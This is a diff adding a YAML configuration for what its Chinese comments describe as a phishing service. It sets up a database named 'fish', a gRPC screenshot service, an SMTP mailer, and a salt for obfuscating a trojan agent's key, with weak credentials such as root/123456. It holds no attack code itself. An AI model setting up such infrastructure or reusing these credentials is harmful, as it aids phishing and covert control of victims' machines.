@@ -1,0 +1,30 @@
+database:
+  host: localhost
+  port: 3306
+  user: root
+  password: 123456
+  db: fish
+
+server:
+  ip: 127.0.0.1 # 这里写真实ip 主要用于图片展示
+  pass: 123456
+  salt: "xxx" # 用于混淆agent马的key 如 123456@qq.com salt为test =>md5(md5(123456@qq.com)test) 小写32位
+  # grpc服务配置 用于图片截图
+  grpc:
+    port: 50001 # grpc服务端口
+  # web服务配置
+  web:
+    port: 50002 # web服务端口库 用于提供钓鱼服务
+    prefix: api # web路径前缀
+  # 静态文件配置
+  static:
+    file_path: ./static # 本地存储文件的路径
+    web_path: /static/img # 网页访问路径前缀 如写/static/img 则web访问路径为 http://ip:port/(web_prefix)/static/img
+
+
+# 邮件配置
+smtp:
+  host: smtp.163.com
+  port: 465
+  user: xxxx@163.com
+  password: xxxxx
